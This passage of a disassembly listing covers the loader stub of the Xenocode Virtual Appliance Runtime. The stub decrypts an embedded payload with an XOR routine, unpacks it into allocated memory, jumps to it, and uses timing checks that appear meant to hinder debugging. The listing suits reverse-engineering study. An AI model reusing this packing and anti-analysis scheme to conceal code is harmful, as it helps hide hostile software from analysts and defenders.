		push	edi		; dwNumberOfBytesToMap
		push	edi		; dwFileOffsetLow
		push	edi		; dwFileOffsetHigh
		push	4		; dwDesiredAccess
		push	[esp+0D00h+hObject] ; hFileMappingObject
		call	ds:MapViewOfFile
		mov	[esp+0CF0h+var_CC0], eax
		cmp	eax, edi
		jz	loc_4046FC
		push	offset a_xvm_mem_appli ; "_xvm_mem_application_info_0x"
		lea	eax, [esp+0CF4h+Name]
		call	sub_404990
		mov	eax, [esp+0CF0h+var_CC0]
		mov	eax, [eax+210h]
		push	10h
		lea	ecx, [esp+0CF4h+Name]
		call	sub_4048F0
		push	[esp+0CF0h+hObject] ; hObject
		call	ds:CloseHandle
		lea	eax, [esp+0CF0h+Name]
		push	eax		; lpName
		push	edi		; bInheritHandle
		push	4		; dwDesiredAccess
		call	esi ; OpenFileMappingW
		mov	esi, ds:GetLastError
		mov	[esp+0CF0h+hObject], eax
		call	esi ; GetLastError
		mov	[esp+0CF0h+var_CE4], eax
		cmp	[esp+0CF0h+hObject], edi
		jz	loc_404725
		push	edi		; dwNumberOfBytesToMap
		push	edi		; dwFileOffsetLow
		push	edi		; dwFileOffsetHigh
		push	4		; dwDesiredAccess
		push	[esp+0D00h+hObject] ; hFileMappingObject
		call	ds:MapViewOfFile
		mov	[esp+0CF0h+var_CBC], eax
		cmp	eax, edi
		jz	loc_40471C
		add	eax, 0Ch
		push	eax
		lea	eax, [esp+0CF4h+FileName]
		call	sub_404990
		push	[esp+0CF0h+hObject] ; hObject
		call	ds:CloseHandle
		jmp	short loc_404381
; ---------------------------------------------------------------------------

loc_404351:				; CODE XREF: start+E6j
		cmp	eax, 2
		jnz	loc_404877
		push	104h		; nSize
		lea	eax, [esp+0CF4h+FileName]
		push	eax		; lpFilename
		push	edi		; hModule
		call	ds:GetModuleFileNameW
		lea	ecx, [esp+0CF0h+FileName]
		call	sub_4048DF
		mov	[esp+0CF0h+var_41C], eax

loc_404381:				; CODE XREF: start+196j
		call	sub_403E41
		mov	ecx, eax
		sub	ecx, dword_40500C
		push	3
		xor	edx, edx
		mov	eax, ecx
		pop	esi
		div	esi
		test	ecx, 0FFFF8000h
		jz	short loc_4043A6

loc_40439F:				; CODE XREF: start+93j
		cmp	edx, edi
		jmp	loc_4044B9
; ---------------------------------------------------------------------------

loc_4043A6:				; CODE XREF: start+1E4j
		lea	eax, [esp+0CF0h+FileName]
		push	eax
		lea	esi, [esp+0CF4h+var_C48]
		call	sub_404956
		push	offset asc_401210 ; ", "
		call	sub_404956
		push	edi		; hTemplateFile
		push	edi		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	edi		; lpSecurityAttributes
		push	7		; dwShareMode
		push	80000000h	; dwDesiredAccess
		lea	eax, [esp+0D08h+FileName]
		push	eax		; lpFileName
		call	ds:CreateFileW
		mov	[esp+0CF0h+hFile], eax
		cmp	eax, 0FFFFFFFFh
		jz	loc_40472F
		call	sub_403DBE
		test	eax, eax
		jnz	loc_4041EF
		xor	edi, edi
		push	edi		; lpName
		push	edi		; dwMaximumSizeLow
		push	edi		; dwMaximumSizeHigh
		push	2		; flProtect
		push	edi		; lpFileMappingAttributes
		push	[esp+0D04h+hFile] ; hFile
		call	ds:CreateFileMappingW
		mov	[esp+0CF0h+hFileMappingObject],	eax
		cmp	eax, edi
		jz	loc_40473C
		mov	esi, ds:MapViewOfFile
		push	1000h		; dwNumberOfBytesToMap
		push	edi		; dwFileOffsetLow
		push	edi		; dwFileOffsetHigh
		push	4		; dwDesiredAccess
		push	eax		; hFileMappingObject
		call	esi ; MapViewOfFile
		mov	[esp+0CF0h+lpBaseAddress], eax
		cmp	eax, edi
		jz	loc_404749
		mov	edi, eax
		call	sub_403DF4
		push	[esp+0CF0h+lpBaseAddress] ; lpBaseAddress
		mov	edi, eax
		mov	[esp+0CF4h+var_CC4], edi
		call	ds:UnmapViewOfFile
		lea	eax, [esp+0CF0h+FileInformation]
		push	eax		; lpFileInformation
		push	[esp+0CF4h+hFile] ; hFile
		call	ds:GetFileInformationByHandle
		test	eax, eax
		jz	loc_404756
		xor	eax, eax
		cmp	[esp+0CF0h+FileInformation.nFileSizeHigh], eax
		jnz	short loc_40447A
		cmp	[esp+0CF0h+FileInformation.nFileSizeLow], edi
		jbe	loc_4048D8

loc_40447A:				; CODE XREF: start+2B2j
		add	edi, 1000h
		push	edi		; dwNumberOfBytesToMap
		push	eax		; dwFileOffsetLow
		push	eax		; dwFileOffsetHigh
		push	4		; dwDesiredAccess
		push	[esp+0D00h+hFileMappingObject] ; hFileMappingObject
		call	esi ; MapViewOfFile
		mov	esi, eax
		mov	[esp+0CF0h+lpBaseAddress], esi
		test	esi, esi
		jz	loc_404763
		call	sub_403E41
		mov	ecx, eax
		sub	ecx, dword_40500C
		push	3
		xor	edx, edx
		mov	eax, ecx
		pop	edi
		div	edi
		test	ecx, 0FFFF8000h
		jz	short loc_4044CD

loc_4044B7:				; CODE XREF: start+52j	start+4F2j
		test	edx, edx

loc_4044B9:				; CODE XREF: start+1E8j
		jz	loc_404820
		cmp	edx, 1
		jz	loc_4041EF
		jmp	loc_404606
; ---------------------------------------------------------------------------

loc_4044CD:				; CODE XREF: start+2FCj
		mov	edi, esi
		call	sub_403DF4
		add	eax, esi
		mov	ecx, [eax]
		mov	[esp+0CF0h+var_CE4], eax
		lea	esi, [eax+4]
		cmp	ecx, 6D7678h
		jnz	loc_404770
		mov	eax, [esi]
		add	esi, 4
		cmp	eax, 1
		jnz	loc_404786
		mov	eax, [esi]
		mov	edi, eax
		imul	edi, 8088405h
		add	esi, 4
		mov	ecx, [esi]
		inc	edi
		mov	edx, edi
		xor	edx, eax
		add	esi, 4
		cmp	edx, ecx
		jnz	loc_40479C
		mov	ecx, [esi]
		mov	eax, edi
		imul	eax, 8088405h
		inc	eax
		mov	edx, eax
		xor	edx, edi
		add	esi, 4
		cmp	edx, ecx
		jnz	loc_4047B2
		mov	ecx, [esi]
		imul	eax, 8088405h
		push	[esp+0CF0h+lpBaseAddress] ; lpBaseAddress
		inc	eax
		xor	ecx, eax
		imul	eax, 8088405h
		add	esi, 4
		inc	eax
		xor	eax, [esi]
		mov	[esp+0CF4h+dwSize], ecx
		mov	[esp+0CF4h+var_CD0], eax
		call	ds:UnmapViewOfFile
		push	[esp+0CF0h+hFileMappingObject] ; hObject
		call	ds:CloseHandle
		xor	eax, eax
		push	eax		; lpName
		push	eax		; dwMaximumSizeLow
		push	eax		; dwMaximumSizeHigh
		push	8		; flProtect
		push	eax		; lpFileMappingAttributes
		push	[esp+0D04h+hFile] ; hFile
		call	ds:CreateFileMappingW
		mov	[esp+0CF0h+hFileMappingObject],	eax
		test	eax, eax
		jz	loc_4047C8
		sub	esi, [esp+0CF0h+var_CE4]
		mov	ecx, [esp+0CF0h+var_CD0]
		add	esi, 4
		add	ecx, esi
		add	ecx, [esp+0CF0h+var_CC4]
		mov	[esp+0CF0h+var_CB8], esi
		push	ecx		; dwNumberOfBytesToMap
		push	0		; dwFileOffsetLow
		push	0		; dwFileOffsetHigh
		push	1		; dwDesiredAccess
		push	eax		; hFileMappingObject
		call	ds:MapViewOfFile
		xor	ecx, ecx
		mov	[esp+0CF0h+lpBaseAddress], eax
		cmp	eax, ecx
		jz	loc_4047D8
		mov	eax, [esp+0CF0h+var_CC4]
		add	eax, esi
		add	eax, [esp+0CF0h+lpBaseAddress]
		mov	esi, [esp+0CF0h+var_CD0]
		mov	[esp+0CF0h+var_CC8], eax
		cmp	esi, ecx
		jbe	short loc_4045E1

loc_4045CA:				; CODE XREF: start+426j
		imul	edi, 343FDh
		add	edi, 269EC3h
		mov	edx, edi
		shr	edx, 10h
		xor	[eax], dl
		inc	eax
		dec	esi
		jnz	short loc_4045CA

loc_4045E1:				; CODE XREF: start+40Fj
		lea	esi, [esp+0CF0h+var_CB4]
		mov	[esp+0CF0h+var_C94], ecx
		mov	[esp+0CF0h+var_C90], ecx
		mov	[esp+0CF0h+var_C8C], ecx
		mov	[esp+0CF0h+var_CB0], ecx
		mov	[esp+0CF0h+var_CB4], ecx
		call	sub_403D10
		test	eax, eax
		jnz	loc_4047E8

loc_404606:				; CODE XREF: start+29j	start+30Fj ...
		push	4		; flProtect
		push	1000h		; flAllocationType
		push	[esp+0CF8h+dwSize] ; dwSize
		push	0		; lpAddress
		call	ds:VirtualAlloc
		mov	esi, eax
		call	sub_403E41
		mov	ecx, eax
		sub	ecx, dword_40500C
		push	3
		xor	edx, edx
		mov	eax, ecx
		pop	edi
		div	edi
		test	ecx, 0FFFF8000h
		jz	short loc_40464B
		test	edx, edx
		jz	loc_404820
		cmp	edx, 1
		jnz	short loc_404606
		jmp	loc_4041EF
; ---------------------------------------------------------------------------

loc_40464B:				; CODE XREF: start+47Ej
		mov	eax, [esp+0CF0h+var_CD0]
		mov	[esp+0CF0h+var_CB0], eax
		mov	eax, [esp+0CF0h+var_CC8]
		mov	[esp+0CF0h+var_CB4], eax
		mov	eax, [esp+0CF0h+dwSize]
		mov	[esp+0CF0h+var_CA4], eax
		lea	eax, [esp+0CF0h+var_CB4]
		push	eax
		mov	[esp+0CF4h+var_CA8], esi
		call	sub_402E20
		pop	ecx
		cmp	eax, 1
		jnz	loc_4047FE
		push	[esp+0CF0h+lpBaseAddress] ; lpBaseAddress
		call	ds:UnmapViewOfFile
		push	[esp+0CF0h+hFileMappingObject] ; hObject
		call	ds:CloseHandle
		call	sub_403E41
		mov	ecx, eax
		sub	ecx, dword_40500C
		push	3
		xor	edx, edx
		mov	eax, ecx
		pop	edi
		div	edi
		test	ecx, 0FFFF8000h
		jnz	loc_4044B7
		push	esi		; dwFreeType
		call	sub_403F08
		mov	[esp+0CF4h+var_CF4], 8000h
		push	[esp+0CF4h+dwSize] ; dwSize
		mov	edi, eax
		push	esi		; lpAddress
		call	ds:VirtualFree
		test	edi, edi
		jz	loc_4048B5
		push	edi
		call	sub_403E6E
		pop	ecx
		mov	[esp+0CF0h+var_CE4], eax
		test	eax, eax
		jnz	loc_404814
		push	offset aThereHasBeenAn ; "There	has been an error starting this	v"...
		mov	eax, ebx
		call	sub_404990
		push	offset a0x0006	; "0x0006"
		jmp	loc_4048AE
; ---------------------------------------------------------------------------

loc_4046FC:				; CODE XREF: start+101j
		call	ds:GetLastError
		push	offset a0x00020	; "0x00020: "

loc_404707:				; CODE XREF: start+56Aj start+581j ...
		lea	esi, [esp+0CF4h+var_C48]
		mov	edi, eax
		call	sub_404956
		mov	eax, edi
		jmp	loc_40488C
; ---------------------------------------------------------------------------

loc_40471C:				; CODE XREF: start+176j
		call	esi ; GetLastError
		push	offset a0x00021	; "0x00021: "
		jmp	short loc_404707
; ---------------------------------------------------------------------------

loc_404725:				; CODE XREF: start+15Bj
		push	offset a0x00022	; "0x00022: "
		jmp	loc_40487C
; ---------------------------------------------------------------------------

loc_40472F:				; CODE XREF: start+22Cj
		call	ds:GetLastError
		push	offset a0x0003	; "0x0003: "
		jmp	short loc_404707
; ---------------------------------------------------------------------------

loc_40473C:				; CODE XREF: start+257j
		call	ds:GetLastError
		push	offset a0x00040	; "0x00040: "
		jmp	short loc_404707
; ---------------------------------------------------------------------------

loc_404749:				; CODE XREF: start+275j
		call	ds:GetLastError
		push	offset a0x00050	; "0x00050: "
		jmp	short loc_404707
; ---------------------------------------------------------------------------

loc_404756:				; CODE XREF: start+2A3j
		call	ds:GetLastError
		push	offset a0x00053	; "0x00053: "
		jmp	short loc_404707
; ---------------------------------------------------------------------------

loc_404763:				; CODE XREF: start+2DAj
		call	ds:GetLastError
		push	offset a0x00051	; "0x00051: "
		jmp	short loc_404707
; ---------------------------------------------------------------------------

loc_404770:				; CODE XREF: start+32Cj
		push	offset aThereHasBeenAn ; "There	has been an error starting this	v"...
		mov	eax, ebx
		call	sub_404990
		push	offset a0x00e00	; "0x00E00"
		jmp	loc_4048AE
; ---------------------------------------------------------------------------

loc_404786:				; CODE XREF: start+33Aj
		push	offset aThereHasBeenAn ; "There	has been an error starting this	v"...
		mov	eax, ebx
		call	sub_404990
		push	offset a0x00e01	; "0x00E01"
		jmp	loc_4048AE
; ---------------------------------------------------------------------------

loc_40479C:				; CODE XREF: start+359j
		push	offset aThereHasBeenAn ; "There	has been an error starting this	v"...
		mov	eax, ebx
		call	sub_404990
		push	offset a0x00e1	; "0x00E1"
		jmp	loc_4048AE
; ---------------------------------------------------------------------------

loc_4047B2:				; CODE XREF: start+373j
		push	offset aThereHasBeenAn ; "There	has been an error starting this	v"...
		mov	eax, ebx
		call	sub_404990
		push	offset a0x00e2	; "0x00E2"
		jmp	loc_4048AE
; ---------------------------------------------------------------------------

loc_4047C8:				; CODE XREF: start+3C4j
		call	ds:GetLastError
		push	offset a0x00041	; "0x00041: "
		jmp	loc_404707
; ---------------------------------------------------------------------------

loc_4047D8:				; CODE XREF: start+3F5j
		call	ds:GetLastError
		push	offset a0x00052	; "0x00052: "
		jmp	loc_404707
; ---------------------------------------------------------------------------

loc_4047E8:				; CODE XREF: start+447j
		push	offset aThereHasBeenAn ; "There	has been an error starting this	v"...
		mov	eax, ebx
		call	sub_404990
		push	offset a0x00z1	; "0x00Z1"
		jmp	loc_4048AE
; ---------------------------------------------------------------------------

loc_4047FE:				; CODE XREF: start+4BCj
		push	offset aThereHasBeenAn ; "There	has been an error starting this	v"...
		mov	eax, ebx
		call	sub_404990
		push	offset a0x00z2	; "0x00Z2"
		jmp	loc_4048AE
; ---------------------------------------------------------------------------

loc_404814:				; CODE XREF: start+527j
		push	0		; lpModuleName
		call	ds:GetModuleHandleA
		mov	[esp+0CF0h+var_CC8], eax

loc_404820:				; CODE XREF: start:loc_4044B9j
					; start+482j
		xor	edi, edi
		push	edi		; lpName
		push	edi		; dwMaximumSizeLow
		push	edi		; dwMaximumSizeHigh
		push	2		; flProtect
		push	edi		; lpFileMappingAttributes
		push	[esp+0D04h+hFile] ; hFile
		call	ds:CreateFileMappingW
		mov	esi, eax
		cmp	esi, edi
		jnz	short loc_404848
		call	ds:GetLastError
		push	offset a0x00042	; "0x00042: "
		jmp	loc_404707
; ---------------------------------------------------------------------------

loc_404848:				; CODE XREF: start+67Dj
		push	[esp+0CF0h+hFile] ; hObject
		call	ds:CloseHandle
		push	[esp+0CF0h+var_CBC]
		mov	ecx, [esp+0CF4h+var_CD0]
		mov	eax, [esp+0CF4h+var_CB8]
		push	[esp+0CF4h+var_CC0]
		add	eax, ecx
		add	eax, [esp+0CF8h+var_CC4]
		push	eax
		push	esi
		push	[esp+0D00h+var_CC8]
		call	[esp+0D04h+var_CE4]
		add	esp, 14h
		jmp	short loc_4048D8
; ---------------------------------------------------------------------------

loc_404877:				; CODE XREF: start+19Bj
		push	offset a0x00023	; "0x00023: "

loc_40487C:				; CODE XREF: start+571j
		lea	esi, [esp+0CF4h+var_C48]
		call	sub_404956
		mov	eax, [esp+0CF0h+var_CE4]

loc_40488C:				; CODE XREF: start+55Ej
		push	0Ah
		lea	ecx, [esp+0CF4h+var_C48]
		call	sub_4048F0
		push	offset aThereHasBeenAn ; "There	has been an error starting this	v"...
		mov	eax, ebx
		call	sub_404990
		lea	eax, [esp+0CF0h+var_C48]
		push	eax

loc_4048AE:				; CODE XREF: start+53Ej start+5C8j ...
		mov	esi, ebx
		call	sub_404956

loc_4048B5:				; CODE XREF: start+514j
		push	offset aMessageboxw ; "MessageBoxW"
		push	offset LibFileName ; "user32.dll"
		call	ds:LoadLibraryW
		push	eax		; hModule
		call	ds:GetProcAddress
		push	10h
		push	offset aXenocodeVirtua ; "Xenocode Virtual Appliance Runtime"
		push	ebx
		push	0
		call	eax

loc_4048D8:				; CODE XREF: start+2BBj start+6BCj
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
start		endp


; =============== S U B	R O U T	I N E =======================================


sub_4048DF	proc near		; CODE XREF: start+1BCp sub_404956+5p
		xor	eax, eax
		cmp	[ecx], ax
		jz	short locret_4048EF

loc_4048E6:				; CODE XREF: sub_4048DF+Ej
		inc	eax
		inc	ecx
		inc	ecx
		cmp	word ptr [ecx],	0
		jnz	short loc_4048E6

locret_4048EF:				; CODE XREF: sub_4048DF+5j
		retn
sub_4048DF	endp


; =============== S U B	R O U T	I N E =======================================


sub_4048F0	proc near		; CODE XREF: sub_403F08+8Ap start+B9p	...

arg_0		= dword	ptr  4

		push	esi
		mov	esi, [ecx+414h]
		push	edi

loc_4048F8:				; CODE XREF: sub_4048F0+2Ej
		xor	edx, edx
		div	[esp+8+arg_0]
		mov	edi, [ecx+414h]
		mov	dx, ds:word_401070[edx*2]
		mov	[ecx+edi*2], dx
		inc	dword ptr [ecx+414h]
		mov	edx, [ecx+414h]
		test	eax, eax
		ja	short loc_4048F8
		xor	eax, eax
		mov	[ecx+edx*2], ax
		mov	eax, [ecx+414h]
		jmp	short loc_40493F
; ---------------------------------------------------------------------------

loc_40492E:				; CODE XREF: sub_4048F0+52j
		movzx	edx, word ptr [ecx+esi*2]
		mov	di, [ecx+eax*2]
		mov	[ecx+esi*2], di
		mov	[ecx+eax*2], dx
		inc	esi

loc_40493F:				; CODE XREF: sub_4048F0+3Cj
		dec	eax
		cmp	esi, eax
		jb	short loc_40492E
		pop	edi
		pop	esi
		retn	4
sub_4048F0	endp

; ---------------------------------------------------------------------------
		and	dword ptr [eax+414h], 0
		xor	ecx, ecx
		mov	[eax], cx
		retn

; =============== S U B	R O U T	I N E =======================================


sub_404956	proc near		; CODE XREF: sub_403F08:loc_4041AFp
					; start+1FCp ...

arg_0		= dword	ptr  4

		mov	ecx, [esp+arg_0]
		push	edi
		call	sub_4048DF
		push	[esp+4+arg_0]
		mov	edi, eax
		mov	eax, [esi+414h]
		lea	edx, [edi+edi]
		lea	eax, [esi+eax*2]
		call	sub_4049FC
		mov	eax, [esi+414h]
		pop	ecx
		add	eax, edi
		xor	ecx, ecx
		mov	[esi+eax*2], cx
		add	[esi+414h], edi
		pop	edi
		retn	4
sub_404956	endp


; =============== S U B	R O U T	I N E =======================================


sub_404990	proc near		; CODE XREF: sub_403F08+3Ep
					; sub_403F08+9Bp ...

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, eax
		and	dword ptr [esi+414h], 0
		xor	eax, eax
		mov	[esi], ax
		call	sub_404956
		pop	esi
		retn	4
sub_404990	endp


; =============== S U B	R O U T	I N E =======================================


sub_4049AC	proc near		; CODE XREF: sub_403F08+7Bp start+A5p

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, eax
		and	dword ptr [esi+414h], 0
		xor	eax, eax
		mov	[esi], ax
		call	sub_404956
		mov	eax, esi
		pop	esi
		retn	4
sub_4049AC	endp


; =============== S U B	R O U T	I N E =======================================


sub_4049CA	proc near		; CODE XREF: sub_403E6E+3Fp
					; sub_403F08+220p
		xor	eax, eax
		cmp	[ecx], al
		jz	short locret_4049D7

loc_4049D0:				; CODE XREF: sub_4049CA+Bj
		inc	eax
		inc	ecx
		cmp	byte ptr [ecx],	0
		jnz	short loc_4049D0

locret_4049D7:				; CODE XREF: sub_4049CA+4j
		retn
sub_4049CA	endp


; =============== S U B	R O U T	I N E =======================================


sub_4049D8	proc near		; CODE XREF: sub_403E6E+4Ap
		add	edx, ecx
		xor	eax, eax
		cmp	ecx, edx
		jz	short locret_4049FB
		push	esi
		mov	esi, offset aRunvm ; "RunVM"
		sub	esi, ecx
		push	edi

loc_4049E9:				; CODE XREF: sub_4049D8+1Fj
		movzx	edi, byte ptr [esi+ecx]
		movzx	eax, byte ptr [ecx]
		sub	eax, edi
		jnz	short loc_4049F9
		inc	ecx
		cmp	ecx, edx
		jnz	short loc_4049E9

loc_4049F9:				; CODE XREF: sub_4049D8+1Aj
		pop	edi
		pop	esi

locret_4049FB:				; CODE XREF: sub_4049D8+6j
		retn
sub_4049D8	endp


; =============== S U B	R O U T	I N E =======================================


sub_4049FC	proc near		; CODE XREF: sub_403F08+B0p
					; sub_403F08+E5p ...

arg_0		= dword	ptr  4

		push	esi
		lea	esi, [eax+edx]
		mov	ecx, eax
		cmp	eax, esi
		jz	short loc_404A18
		push	edi
		mov	edi, [esp+8+arg_0]
		sub	edi, eax

loc_404A0D:				; CODE XREF: sub_4049FC+19j
		mov	dl, [edi+ecx]
		mov	[ecx], dl
		inc	ecx
		cmp	ecx, esi
		jnz	short loc_404A0D
		pop	edi

loc_404A18:				; CODE XREF: sub_4049FC+8j
		pop	esi
		retn
sub_4049FC	endp

; ---------------------------------------------------------------------------
		push	dword ptr [esp+4]
		push	0
		call	ds:GetProcessHeap
		push	eax
		call	ds:HeapFree
		retn
; ---------------------------------------------------------------------------
		push	dword ptr [esp+4]
		push	0
		call	ds:GetProcessHeap
		push	eax
		call	ds:HeapAlloc
		retn
; ---------------------------------------------------------------------------
		align 4
		dd 4A6Ch, 2 dup(0)
		dd 4C0Ch, 1000h, 5 dup(0)
		dd 4ABCh, 4AC8h, 4ADAh,	4AE6h, 4AF6h, 4B0Ch, 4B22h, 4B36h
		dd 4B46h, 4B56h, 4B64h,	4B72h, 4B88h, 4B9Ah, 4BB8h, 4BC8h
		dd 4BD6h, 4BEAh, 4BFCh,	0
		dd 6548029Dh, 6C417061h, 636F6Ch, 65470223h, 6F725074h
		dd 73736563h, 70616548h, 2A10000h, 70616548h, 65657246h
		dd 2660000h, 54746547h,	436B6369h, 746E756Fh, 1F50000h
aGetmodulefilen	db 'GetModuleFileNameW',0
		align 4
		db 0AAh	; 
		db 1, 47h, 65h
aTcurrentproces	db 'tCurrentProcessId',0
		dw 32Ch
aOpenfilemappin	db 'OpenFileMappingW',0
		align 2
		dw 1E6h
aGetlasterror	db 'GetLastError',0
		align 2
		dw 30Ah
aMapviewoffile	db 'MapViewOfFile',0
aC		db 'C',0
aClosehandle	db 'CloseHandle',0
		dd 7243007Fh, 65746165h, 656C6946h, 7C0057h
aCreatefilemapp	db 'CreateFileMappingW',0
		align 4
		dd 6E550441h, 5670616Dh, 4F776569h, 6C694666h, 1D00065h
aGetfileinforma	db 'GetFileInformationByHandle',0
		align 4
		dd 69560454h, 61757472h, 6C6C416Ch, 636Fh, 69560457h, 61757472h
		dd 6572466Ch, 1F60065h,	4D746547h, 6C75646Fh, 6E614865h
		dd 41656C64h, 2200000h,	50746547h, 41636F72h, 65726464h
		dd 7373h, 6F4C02F4h, 694C6461h,	72617262h, 5779h, 4E52454Bh
		dd 32334C45h, 6C6C642Eh, 7Ah dup(0)
		dd 80h dup(?)
_text		ends

; Section 2. (virtual address 00005000)
; Virtual size			: 00000428 (   1064.)
; Section size in file		: 00000000 (	  0.)
; Offset to raw	data for section: 00004200
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 405000h
dword_405000	dd ?			; DATA XREF: sub_403D85+17w
					; sub_403F08+248r
		dd 2 dup(?)
dword_40500C	dd ?			; DATA XREF: sub_403E6E+81r
					; sub_403F08+106r ...
dword_405010	dd 3FCh	dup(?)		; DATA XREF: sub_403F08+32o
					; sub_403F08+8Fo ...
_data		ends

; Section 3. (virtual address 00006000)
; Virtual size			: 00019000 ( 102400.)
; Section size in file		: 00000000 (	  0.)
; Offset to raw	data for section: 00004200
; Flags	00000000: Regular (allocated, relocated, loaded)
; Alignment	: default
; ===========================================================================

; Segment type:	Regular
_xcpad		segment	para public '' use32
		assume cs:_xcpad
		;org 406000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
		dd 6400h dup(?)
_xcpad		ends

; Section 4. (virtual address 0001F000)
; Virtual size			: 00000272 (	626.)
; Section size in file		: 00000400 (   1024.)
; Offset to raw	data for section: 00004200
; Flags	40000040: Data Readable
; Alignment	: default
;
; Imports from KERNEL32.dll
;
; ===========================================================================

; Segment type:	Externs
; _idata
; LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes)
		extrn HeapAlloc:dword	; CODE XREF: .text:004025C3p
					; .text:00404A3Bp
					; DATA XREF: ...
; HANDLE __stdcall GetProcessHeap()
		extrn GetProcessHeap:dword ; CODE XREF:	.text:00402597p
					; .text:004025BCp ...
; BOOL __stdcall HeapFree(HANDLE hHeap,	DWORD dwFlags, LPVOID lpMem)
		extrn HeapFree:dword	; CODE XREF: .text:0040259Ep
					; .text:00404A27p
					; DATA XREF: ...
; DWORD	__stdcall GetTickCount()
		extrn GetTickCount:dword ; CODE	XREF: sub_403DE6p
					; sub_403E41+15p ...
; DWORD	__stdcall GetModuleFileNameW(HMODULE hModule, LPWCH lpFilename,	DWORD nSize)
		extrn GetModuleFileNameW:dword ; CODE XREF: sub_403DBE+9p
					; start+1AFp
					; DATA XREF: ...
; DWORD	__stdcall GetCurrentProcessId()
		extrn GetCurrentProcessId:dword	; CODE XREF: start+ACp
					; DATA XREF: start+ACr
; HANDLE __stdcall OpenFileMappingW(DWORD dwDesiredAccess, BOOL	bInheritHandle,	LPCWSTR	lpName)
		extrn OpenFileMappingW:dword ; CODE XREF: start+D2p start+145p
					; DATA XREF: ...
; DWORD	__stdcall GetLastError()
		extrn GetLastError:dword ; CODE	XREF: sub_403F08+68p start+D8p ...
; LPVOID __stdcall MapViewOfFile(HANDLE	hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap)
		extrn MapViewOfFile:dword ; CODE XREF: start+F5p start+16Ap ...
; BOOL __stdcall CloseHandle(HANDLE hObject)
		extrn CloseHandle:dword	; CODE XREF: start+134p start+190p ...
; HANDLE __stdcall CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD	dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
		extrn CreateFileW:dword	; CODE XREF: start+21Fp
					; DATA XREF: start+21Fr
; HANDLE __stdcall CreateFileMappingW(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCWSTR lpName)
		extrn CreateFileMappingW:dword ; CODE XREF: start+24Bp
					; start+3B8p ...
; BOOL __stdcall UnmapViewOfFile(LPCVOID lpBaseAddress)
		extrn UnmapViewOfFile:dword ; CODE XREF: start+28Cp start+39Cp ...
; BOOL __stdcall GetFileInformationByHandle(HANDLE hFile, LPBY_HANDLE_FILE_INFORMATION lpFileInformation)
		extrn GetFileInformationByHandle:dword ; CODE XREF: start+29Bp
					; DATA XREF: start+29Br
; LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
		extrn VirtualAlloc:dword ; CODE	XREF: sub_403F08+59p
					; start+45Ap
					; DATA XREF: ...
; BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
		extrn VirtualFree:dword	; CODE XREF: start+50Cp
					; DATA XREF: start+50Cr
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
		extrn GetModuleHandleA:dword ; CODE XREF: sub_403D85+Ap
					; sub_403F08+1E2p ...
; FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
		extrn GetProcAddress:dword ; CODE XREF:	sub_403D85+11p
					; start+70Dp
					; DATA XREF: ...
; HMODULE __stdcall LoadLibraryW(LPCWSTR lpLibFileName)
		extrn LoadLibraryW:dword ; CODE	XREF: start+706p
					; DATA XREF: start+706r



		end start
